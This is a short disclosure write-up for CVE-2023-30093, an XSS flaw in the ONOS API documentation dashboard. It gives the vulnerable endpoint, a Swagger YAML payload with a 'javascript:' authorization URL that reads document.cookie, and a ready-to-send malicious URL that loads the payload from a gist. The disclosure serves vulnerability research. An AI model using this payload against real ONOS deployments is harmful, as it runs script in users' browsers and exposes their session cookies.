# CVE-2023-30093

Description
------

A cross-site scripting (XSS) vulnerability in Open Networking Foundation ONOS from version v1.9.0 to v2.7.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the url parameter of the API documentation dashboard.

PoC
------

PoC for CVE-2023-30093: [@edoardottt Youtube video](https://www.youtube.com/watch?v=jZr2JhDd_S8)

Vulnerable endpoint: http://localhost:8181/onos/v1/docs/

Payload: 
```yaml
swagger: "2.0"
info:
  title: edoardottt XSS
  description: XSS ONOS POC
  version: 1.0.0
host: edoardoottavianelli.it
basePath: /v1
schemes:
  - https

securityDefinitions:
  OAuth2:
    type: oauth2
    flow: accessCode
    authorizationUrl: javascript:alert(document.cookie)//
    tokenUrl: https://example.com/oauth/token
    scopes:
      read: Grants read access
      write: Grants write access
      admin: Grants read and write access to administrative information
```

Malicious URL ready to be delivered: http://localhost:8181/onos/v1/docs/?url=https://gist.githubusercontent.com/edoardottt/917636d9b210d0b15c3a10cfff35ab33/raw/659a4ae263287dff740f386db4533ca042203cfe/onos-xss2-poc.yaml